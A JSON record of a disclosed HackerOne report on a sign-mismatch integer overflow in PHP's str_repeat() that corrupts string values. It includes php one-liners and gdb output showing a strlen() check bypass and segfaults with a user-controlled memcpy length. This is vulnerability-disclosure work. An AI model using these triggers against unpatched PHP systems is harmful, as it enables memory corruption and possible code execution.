{
  "id": 73255,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzI1NQ==",
  "url": "https://hackerone.com/reports/73255",
  "title": "str_repeat() sign mismatch based memory corruption",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-04-09T00:00:00.000Z",
  "submitted_at": "2015-04-09T00:00:00.000Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "cogitoergor00t",
    "url": "/cogitoergor00t",
    "profile_picture_urls": {
      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NDYxMSwicHVyIjoiYmxvYl9pZCJ9fQ==--9fc12b844b1896456b2860b9b03896c25ddeca82/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--2de8067d228529d65848a4eeed0bed0bb2531bc3/me.jpg"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6Y5ZB2QS%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T212657Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA19dryA1E7Vzkkho6i%2FOvvU3lexf9dyuY4m9DU%2FX5%2FHAiBVyEoDdLRbo6TdP72jN96HrlUZmZQwcDGG5YugQcluYCqxBQg0EAMaDDAxMzYxOTI3NDg0OSIMAtImyhrBxIJMZbJeKo4FPQLdWSB0cnxL3JX3REsOmZShU4EvSPW8VYGcw4kw79ZkjLocCn0wDj9ZwVVjj8FfrtkSyPiHG3yOq%2BtfMTnd8Tw7BGw34LUnFj6paLe64gkfKRkXB747AXqJUT0imrRp7k7XD6dPU1%2Fs11TsXbYbXV6f%2Bv%2FwCLyjZ9ZNNMT0NchKK8C1r4gqjaCmzZxH9SPzjqPlK6b4d3uYtd1D39nlfTR7e0mBxqEJxqkBSmPqtqh56YEJK3%2FSeHzU3iVDM%2BbXpCTI7HDfj3oiGUMHtMg5NMI992sgnNQgOpATctShNHgS%2BehUSESV%2BxER50X7LdWyUQhlhwSUXDZPb%2FDa%2FjZSZ8gn4e97udOo%2FFz1IOgr2AHPL8prA4Sl104UJliUu5WJ0dNwUAb%2BtrGW77R1Nf730EezJPh1KDbz5hXvJZb1KroQ5QU0t%2BhEwMDI9SnzFjL5hlDjAiDI8Ej6f7CYv3ItKRr%2BRnXILasmes%2FROfp8ELQPSyu%2BzuIlnOkl4WY2Hx3GkV%2Fcn%2FxgZWZ6qdfzs1eQud0R3ubI%2BtERXyd7PMeZcpKOq0DuLkzkRzHA%2FoJnb2R4HoDRdAAtcFU4OLuvZ61O0WVQlb6sFfWNX1CtzUn0wor7VcBto5hDzYCLJET7B78OsKpCFhGOMqtoSK5CVMWAtZO6VIddrnkXVjL622Ck%2FMAXXPhAL6tZTcMIBRrzm2g2QCH%2BiBFufdQf8ml%2F6wW5k0qtV5rKSDyRiWsiCRN8KJ9IqsdCgy9PIgF%2Fqyl3QoJ83Iwv5ej6%2BwPiOKQumOXK3M0Qa3k7enVNFuNx%2BtZwaD2JepsEX8q7U%2BgFCG3szUTIPyZ3JcK7fqaD3j%2FkXuvQjGpRi6uWwQqvjVvv5LBCMJ%2B1xsYGOrIBULQw21ENIbyIcORcOqvKpuwzae%2FNC2qmc7TPy7CIPNq8QVjpZzl02gPB3pHEPUTUgMKB8aeQLKYrbJ49TbK1wzqCOMLVPbPUKAGWCwqCOnOGJgI%2FxxBiKst8lcMtDFHTkoVaJJG3b%2BgBpn5NGpwCcoHr7l00%2FaWAb2C7EXlpYAbl%2BBrtN4dqyKO3LafGwQQK26P5CBDjyqrvMSiRjaHKXTjto11SbCUGTt7KmcHlDGwy8g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=846599b18395532637166f5e9a182741d6796819ca946ab0e036912c2aa06130",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6Y5ZB2QS%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T212657Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA19dryA1E7Vzkkho6i%2FOvvU3lexf9dyuY4m9DU%2FX5%2FHAiBVyEoDdLRbo6TdP72jN96HrlUZmZQwcDGG5YugQcluYCqxBQg0EAMaDDAxMzYxOTI3NDg0OSIMAtImyhrBxIJMZbJeKo4FPQLdWSB0cnxL3JX3REsOmZShU4EvSPW8VYGcw4kw79ZkjLocCn0wDj9ZwVVjj8FfrtkSyPiHG3yOq%2BtfMTnd8Tw7BGw34LUnFj6paLe64gkfKRkXB747AXqJUT0imrRp7k7XD6dPU1%2Fs11TsXbYbXV6f%2Bv%2FwCLyjZ9ZNNMT0NchKK8C1r4gqjaCmzZxH9SPzjqPlK6b4d3uYtd1D39nlfTR7e0mBxqEJxqkBSmPqtqh56YEJK3%2FSeHzU3iVDM%2BbXpCTI7HDfj3oiGUMHtMg5NMI992sgnNQgOpATctShNHgS%2BehUSESV%2BxER50X7LdWyUQhlhwSUXDZPb%2FDa%2FjZSZ8gn4e97udOo%2FFz1IOgr2AHPL8prA4Sl104UJliUu5WJ0dNwUAb%2BtrGW77R1Nf730EezJPh1KDbz5hXvJZb1KroQ5QU0t%2BhEwMDI9SnzFjL5hlDjAiDI8Ej6f7CYv3ItKRr%2BRnXILasmes%2FROfp8ELQPSyu%2BzuIlnOkl4WY2Hx3GkV%2Fcn%2FxgZWZ6qdfzs1eQud0R3ubI%2BtERXyd7PMeZcpKOq0DuLkzkRzHA%2FoJnb2R4HoDRdAAtcFU4OLuvZ61O0WVQlb6sFfWNX1CtzUn0wor7VcBto5hDzYCLJET7B78OsKpCFhGOMqtoSK5CVMWAtZO6VIddrnkXVjL622Ck%2FMAXXPhAL6tZTcMIBRrzm2g2QCH%2BiBFufdQf8ml%2F6wW5k0qtV5rKSDyRiWsiCRN8KJ9IqsdCgy9PIgF%2Fqyl3QoJ83Iwv5ej6%2BwPiOKQumOXK3M0Qa3k7enVNFuNx%2BtZwaD2JepsEX8q7U%2BgFCG3szUTIPyZ3JcK7fqaD3j%2FkXuvQjGpRi6uWwQqvjVvv5LBCMJ%2B1xsYGOrIBULQw21ENIbyIcORcOqvKpuwzae%2FNC2qmc7TPy7CIPNq8QVjpZzl02gPB3pHEPUTUgMKB8aeQLKYrbJ49TbK1wzqCOMLVPbPUKAGWCwqCOnOGJgI%2FxxBiKst8lcMtDFHTkoVaJJG3b%2BgBpn5NGpwCcoHr7l00%2FaWAb2C7EXlpYAbl%2BBrtN4dqyKO3LafGwQQK26P5CBDjyqrvMSiRjaHKXTjto11SbCUGTt7KmcHlDGwy8g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a55dd64a5e76e33686ba1c27dbbfc47cf155bc96773cf0c29c51ceee627ae7b4"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2015-05-12T00:00:00.000Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2015-05-12T00:00:00.000Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# OVERVIEW\nstr_repeat() suffers from a sign mismatch based integer overflow that results in creation of corrupted ZVALs; this condition, depending on the context, can be abused to bypass PHP-level checks or trigger any kind of memory error: a successful exploitation of this issue is likely to produce both local and remote code execution vectors.\n\n# DETAILS\nstr_repeat() takes mult as second argument, which represents the number of desired repetitions for the string passed as first argument. Once retrieved, this value is multiplied by input_len and stored into result_len\n\n```\n    /* Initialize the result string */\n4907    result_len = input_len * mult;\nwhich then, on line 4930 is passed as argument for RETURN_STRINGL() macro.\nIt should be noticed that while RETURN_STRINGL() ends up calling ZVAL_STRINGL(), which expects the length argument to be a signed int, result_len is defined as size_t, producing an implicit cast of the actual value.\nIn situations in which huge memory allocations are possible (most likely 64-bit systems), it is possible to take advantage of this situation overflowing ZVAL_STRINGL's length into a negative value, in order to get a corrupted string-typed ZVAL.\n(gdb) r -r 'var_dump(str_repeat(\"a\", 4294967294+1));'\n\nBreakpoint 1, php_var_dump (struc=0x7ffff7f8a188, level=level@entry=1)\n    at /build/buildd/php5-5.6.7+dfsg/ext/standard/var.c:88\n88        /build/buildd/php5-5.6.7+dfsg/ext/standard/var.c: No such file or directory.\n(gdb) p **struc\n$7 = {value = {lval = 140732723359792, dval = 6,9531203857753119e-310, str = {\n      val = 0x7ffee3fbf030 'a' <repeats 200 times>..., len = -1}, \n    ht = 0x7ffee3fbf030, obj = {handle = 3824939056, \n      handlers = 0x7fffffffffff}, ast = 0x7ffee3fbf030}, refcount__gc = 1, \n  type = 6 '\\006', is_ref__gc = 0 '\\000'}\n```\n\n# EXPLOITATION\nThe easiest use of this issue could be bypassing PHP-level checks:\n\n```\n$ php -r 'echo strlen(str_repeat(\"a\", 4294967294));'\n-2\n```\n\nMore interesting scenario comes up when more complex elaborations are applied to a corrupted ZVAL, here I'm gonna list a non-exaustive series of examples which could differ both in severity and exploitability, just to give you an idea.\n\n```\n(gdb) r -r 'strtoupper(str_repeat(\"a\", 4294967294+1));'\nStarting program: /usr/bin/php -r 'strtoupper(str_repeat(\"a\", 4294967294+1));'\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37\n37        ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n(gdb) x/i $pc\n=> 0x7ffff5b2b005 <__memcpy_sse2_unaligned+53>:        movdqu %xmm8,-0x10(%rdi,%rdx,1)\n\n(gdb) p/x $rdx\n$15 = 0xffffffff\n <== user controlled\n(gdb) p/x $rdi\n$16 = 0x7ffff7fc0a70\n(gdb) p $xmm8\n$17 = {v4_float = {2,59845894e+20, 2,59845894e+20, 2,59845894e+20, \n    2,59845894e+20}, v2_double = {1,2217638442043777e+161, \n    1,2217638442043777e+161}, v16_int8 = {97 <repeats 16 times>}, v8_int16 = {\n    24929, 24929, 24929, 24929, 24929, 24929, 24929, 24929}, v4_int32 = {\n    1633771873, 1633771873, 1633771873, 1633771873}, v2_int64 = {\n    7016996765293437281, 7016996765293437281}, \n  uint128 = 0x61616161616161616161616161616161}\n\n\n\n(gdb) r -r 'md5(str_repeat(\"a\", 4294967294-1));'\n\nProgram received signal SIGSEGV, Segmentation fault.\nbody (ctx=ctx@entry=0x7fffffffc5c0, data=data@entry=0x7ffee3fbf030, \n    size=18446744069414182912)\n    at /build/buildd/php5-5.6.7+dfsg/ext/standard/md5.c:214\n214        /build/buildd/php5-5.6.7+dfsg/ext/standard/md5.c: No such file or directory.\n\n\n(gdb) r -r 'str_repeat(\"a\", 4294967294+1).\"\";'\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:152\n152        ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n```\n",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 1,
  "voters": [
    "shivammusic"
  ],
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
